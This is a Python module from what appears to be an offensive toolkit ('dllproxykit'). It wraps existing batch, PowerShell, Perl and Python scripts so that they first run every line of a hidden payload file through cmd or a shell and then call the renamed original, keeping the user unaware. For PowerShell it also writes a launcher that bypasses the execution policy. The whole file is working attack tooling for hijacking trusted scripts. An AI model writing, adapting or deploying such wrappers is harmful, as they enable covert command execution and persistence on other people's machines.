#!/usr/bin/env python3
"""Generate script wrappers that run a payload then the original."""

from __future__ import annotations

from pathlib import Path
from typing import Iterable

from .. import ui as console
from ..core.common import (
    DEFAULT_PAYLOAD,
    PAYLOAD_FALLBACK,
    PAYLOAD_NAME,
    Result,
    orig_sidecar,
    print_summary,
    resolve_io,
    skip_proxy_target,
)


_PS1_CMD_MARK = "dllproxykit-ps1"


def _is_ps1_cmd_sidecar(path: Path) -> bool:
    if path.suffix.lower() != ".cmd":
        return False
    try:
        return _PS1_CMD_MARK in path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return False


def should_skip(path: Path, skips: Iterable[str]) -> str | None:
    if _is_ps1_cmd_sidecar(path):
        return "ps1 cmd launcher"
    return skip_proxy_target(path, skips)


def remove_ps1_cmd_sidecar(ps1: Path) -> None:
    cmd = ps1.with_suffix(".cmd")
    if not _is_ps1_cmd_sidecar(cmd):
        return
    try:
        cmd.unlink()
    except OSError:
        pass


def _wrapper_bat(orig_name: str) -> str:
    name = PAYLOAD_NAME
    fallback = str(PAYLOAD_FALLBACK)
    return (
        "@echo off\r\n"
        f'set "P=%~dp0{name}"\r\n'
        f'if not exist "%P%" set "P={fallback}"\r\n'
        'if exist "%P%" (\r\n'
        '  for /f "usebackq delims=" %%L in ("%P%") do cmd /c %%L\r\n'
        ")\r\n"
        f'call "%~dp0{orig_name}" %*\r\n'
    )


def _wrapper_ps1(orig_name: str) -> str:
    orig = orig_name.replace("'", "''")
    fallback = str(PAYLOAD_FALLBACK).replace("'", "''")
    return (
        "$here = $PSScriptRoot\n"
        "if (-not $here) { $here = Split-Path -Parent $MyInvocation.MyCommand.Path }\n"
        f"$payload = Join-Path $here '{PAYLOAD_NAME}'\n"
        f"if (-not (Test-Path -LiteralPath $payload)) {{ $payload = '{fallback}' }}\n"
        "if (Test-Path -LiteralPath $payload) {\n"
        "  Get-Content -LiteralPath $payload | ForEach-Object {\n"
        "    $line = $_.Trim()\n"
        "    if ($line) { cmd /c $line }\n"
        "  }\n"
        "}\n"
        f"& (Join-Path $here '{orig}') @args\n"
    )


def _wrapper_ps1_cmd(orig_name: str) -> str:
    name = PAYLOAD_NAME
    fallback = str(PAYLOAD_FALLBACK)
    return (
        "@echo off\r\n"
        f"REM {_PS1_CMD_MARK}\r\n"
        f'set "P=%~dp0{name}"\r\n'
        f'if not exist "%P%" set "P={fallback}"\r\n'
        'if exist "%P%" (\r\n'
        '  for /f "usebackq delims=" %%L in ("%P%") do cmd /c %%L\r\n'
        ")\r\n"
        f'powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0{orig_name}" %*\r\n'
    )


def _wrapper_pl(orig_name: str) -> str:
    orig = orig_name.replace("\\", "\\\\").replace("'", "\\'")
    name = PAYLOAD_NAME.replace("\\", "\\\\").replace("'", "\\'")
    fallback = str(PAYLOAD_FALLBACK).replace("\\", "\\\\").replace("'", "\\'")
    return (
        "use strict;\n"
        "use warnings;\n"
        "use File::Basename qw(dirname);\n"
        "use File::Spec;\n"
        "my $dir = dirname(__FILE__);\n"
        f'my $payload = File::Spec->catfile($dir, "{name}");\n'
        f'$payload = "{fallback}" unless -e $payload;\n'
        "if (-e $payload) {\n"
        "  open my $fh, '<', $payload or die $!;\n"
        "  while (my $line = <$fh>) {\n"
        "    $line =~ s/\\s+$//;\n"
        '    system("cmd", "/c", $line) if length $line;\n'
        "  }\n"
        "}\n"
        f"my $orig = File::Spec->catfile($dir, '{orig}');\n"
        "exec($^X, $orig, @ARGV) or die $!;\n"
    )


def _wrapper_py(orig_name: str) -> str:
    return (
        "import pathlib, subprocess, sys\n"
        "here = pathlib.Path(__file__).resolve().parent\n"
        f"payload = here / {PAYLOAD_NAME!r}\n"
        "if not payload.is_file():\n"
        f"    payload = pathlib.Path({str(PAYLOAD_FALLBACK)!r})\n"
        "if payload.is_file():\n"
        "    for line in payload.read_text(encoding='utf-8').splitlines():\n"
        "        line = line.strip()\n"
        "        if line:\n"
        "            subprocess.run(line, shell=True, check=False)\n"
        f"orig = here / {orig_name!r}\n"
        "raise SystemExit(subprocess.call([sys.executable, str(orig), *sys.argv[1:]]))\n"
    )


_WRAPPERS = {
    ".bat": _wrapper_bat,
    ".cmd": _wrapper_bat,
    ".ps1": _wrapper_ps1,
    ".pl": _wrapper_pl,
    ".py": _wrapper_py,
}


def process_one(src: Path, out_dir: Path, dest_name: str | None = None) -> str:
    name = dest_name or src.name
    ext = Path(name).suffix.lower()
    make = _WRAPPERS.get(ext)
    if make is None:
        raise ValueError(f"unsupported script type {ext}")
    orig_name = orig_sidecar(Path(name)).name
    (out_dir / orig_name).write_bytes(src.read_bytes())
    text = make(orig_name)
    newline = "" if ext in {".bat", ".cmd"} else "\n"
    (out_dir / name).write_text(text, encoding="utf-8", newline=newline)
    extra = ""
    if ext == ".ps1":
        cmd_name = f"{Path(name).stem}.cmd"
        cmd_path = out_dir / cmd_name
        if not cmd_path.exists() or _is_ps1_cmd_sidecar(cmd_path):
            cmd_path.write_text(_wrapper_ps1_cmd(orig_name), encoding="utf-8", newline="")
            extra = f"  +  {cmd_name}"
    console.ok(f"{name}  +  {orig_name}{extra}")
    return name


def run(
    input: str | Path,
    output: str | Path | None = None,
    payload: str = DEFAULT_PAYLOAD,
    skip: str | None = None,
    keep_going: bool = False,
    compilers=None,
    ext: str = ".bat",
) -> int:
    del compilers
    try:
        files, out_dir, dest_name = resolve_io(
            Path(input).resolve(),
            str(output) if output is not None else None,
            ext,
        )
    except (FileNotFoundError, ValueError) as exc:
        console.fail(str(exc))
        return 1

    out_dir.mkdir(parents=True, exist_ok=True)
    skips = tuple(s.strip().lower() for s in (skip or "").split(",") if s.strip())

    succeeded: list[str] = []
    skipped: list[Result] = []
    failed: list[Result] = []

    for path in files:
        reason = should_skip(path, skips)
        if reason is not None:
            skipped.append(Result(path.name, reason))
            continue
        try:
            succeeded.append(process_one(path, out_dir, dest_name))
        except Exception as exc:
            failed.append(Result(path.name, str(exc)))
            console.fail(f"{path.name}  {exc}")
            if not keep_going:
                console.warn("aborting  (use --keep-going)")
                break

    print_summary(ext.lstrip("."), succeeded, skipped, failed, out_dir)
    return 0 if not failed else 2
